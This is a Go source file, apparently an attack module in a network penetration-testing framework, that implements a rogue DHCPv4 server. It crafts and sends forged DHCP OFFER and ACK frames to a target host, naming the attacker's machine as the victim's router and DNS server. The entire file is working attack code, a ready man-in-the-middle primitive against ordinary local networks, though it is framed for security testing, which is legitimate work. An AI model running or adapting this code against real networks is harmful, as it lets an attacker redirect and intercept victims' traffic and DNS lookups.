// roguedhcp.go implements the rogue DHCPv4 server attack behavior. The
// attack emits OFFER and ACK frames from a rogue server, offering a lease
// with the 1800 s lifetime the catalog carries as the decay bound.

package ip6

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"net"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
	"go.aledante.io/FlowSeer/src/edge/netpen/link"
)

type rogueDHCPFinding struct {
	Action   string `json:"action"`
	ServerID string `json:"server_id"`
	OfferIP  string `json:"offer_ip"`
	LeaseTTL uint32 `json:"lease_ttl"`
}

// RunRogueDHCP sends an OFFER then an ACK to the target's victim, leasing
// the target's offer IP from the attack leg's own IPv4 as server, router,
// and DNS. The transaction ID and subnet mask are probe content. The
// verdict is pending: whether the victim took the lease needs a REQUEST
// listener that phase 2 adds.
func RunRogueDHCP(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVictim, check.FieldVictimMAC, check.FieldOfferIP); err != nil {
		return check.Verdict{}, err
	}
	addr := deps.AttackLeg.Addr()
	victim := deps.Target.Victim
	offerIP := deps.Target.OfferIP

	leaseTime := make([]byte, 4)
	binary.BigEndian.PutUint32(leaseTime, 1800)

	// OFFER frame.
	offer, err := craftDHCPOffer(addr, victim, offerIP, leaseTime)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "roguedhcp: craft offer")
	}
	if err := deps.AttackLeg.Send(ctx, offer); err != nil {
		return check.Verdict{}, errs.Wrap(err, "roguedhcp: send offer")
	}

	// ACK frame.
	ack, err := craftDHCPAck(addr, victim, offerIP, leaseTime)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "roguedhcp: craft ack")
	}
	if err := deps.AttackLeg.Send(ctx, ack); err != nil {
		return check.Verdict{}, errs.Wrap(err, "roguedhcp: send ack")
	}

	detail, _ := json.Marshal(rogueDHCPFinding{
		Action:   "rogue-dhcpv4-server",
		ServerID: addr.IPv4.String(),
		OfferIP:  offerIP.String(),
		LeaseTTL: 1800,
	})
	deps.Emitter.Finding("dhcp", detail)

	return check.Pending("no observable: lease acceptance needs a REQUEST listener"), nil
}

func craftDHCPOffer(addr link.Addr, client check.Host, offerIP net.IP, leaseTime []byte) ([]byte, error) {
	rogueIP := addr.IPv4
	eth := &layers.Ethernet{
		DstMAC:       client.MAC,
		SrcMAC:       addr.MAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      128,
		SrcIP:    rogueIP,
		DstIP:    client.IP,
		Protocol: layers.IPProtocolUDP,
	}
	udp := &layers.UDP{
		SrcPort: 67,
		DstPort: 68,
	}
	_ = udp.SetNetworkLayerForChecksum(ip)

	dhcp := &layers.DHCPv4{
		Operation:    layers.DHCPOpReply,
		HardwareType: layers.LinkTypeEthernet,
		HardwareLen:  6,
		Xid:          dhcpXid,
		Flags:        0,
		ClientIP:     net.IPv4(0, 0, 0, 0),
		YourClientIP: offerIP,
		NextServerIP: rogueIP,
		RelayAgentIP: net.IPv4(0, 0, 0, 0),
		ClientHWAddr: client.MAC,
		Options: layers.DHCPOptions{
			layers.NewDHCPOption(layers.DHCPOptMessageType, []byte{byte(layers.DHCPMsgTypeOffer)}),
			layers.NewDHCPOption(layers.DHCPOptServerID, rogueIP.To4()),
			layers.NewDHCPOption(layers.DHCPOptLeaseTime, leaseTime),
			layers.NewDHCPOption(layers.DHCPOptSubnetMask, net.IPv4(255, 255, 255, 0).To4()),
			layers.NewDHCPOption(layers.DHCPOptRouter, rogueIP.To4()),
			layers.NewDHCPOption(layers.DHCPOptDNS, rogueIP.To4()),
		},
	}
	return craft.Default(eth, ip, udp, dhcp)
}

func craftDHCPAck(addr link.Addr, client check.Host, offerIP net.IP, leaseTime []byte) ([]byte, error) {
	rogueIP := addr.IPv4
	eth := &layers.Ethernet{
		DstMAC:       client.MAC,
		SrcMAC:       addr.MAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      128,
		SrcIP:    rogueIP,
		DstIP:    client.IP,
		Protocol: layers.IPProtocolUDP,
	}
	udp := &layers.UDP{
		SrcPort: 67,
		DstPort: 68,
	}
	_ = udp.SetNetworkLayerForChecksum(ip)

	dhcp := &layers.DHCPv4{
		Operation:    layers.DHCPOpReply,
		HardwareType: layers.LinkTypeEthernet,
		HardwareLen:  6,
		Xid:          dhcpXid,
		Flags:        0,
		ClientIP:     client.IP,
		YourClientIP: offerIP,
		NextServerIP: rogueIP,
		RelayAgentIP: net.IPv4(0, 0, 0, 0),
		ClientHWAddr: client.MAC,
		Options: layers.DHCPOptions{
			layers.NewDHCPOption(layers.DHCPOptMessageType, []byte{byte(layers.DHCPMsgTypeAck)}),
			layers.NewDHCPOption(layers.DHCPOptServerID, rogueIP.To4()),
			layers.NewDHCPOption(layers.DHCPOptLeaseTime, leaseTime),
			layers.NewDHCPOption(layers.DHCPOptSubnetMask, net.IPv4(255, 255, 255, 0).To4()),
			layers.NewDHCPOption(layers.DHCPOptRouter, rogueIP.To4()),
			layers.NewDHCPOption(layers.DHCPOptDNS, rogueIP.To4()),
		},
	}
	return craft.Default(eth, ip, udp, dhcp)
}

var _ gopacket.SerializableLayer = (*layers.DHCPv4)(nil)
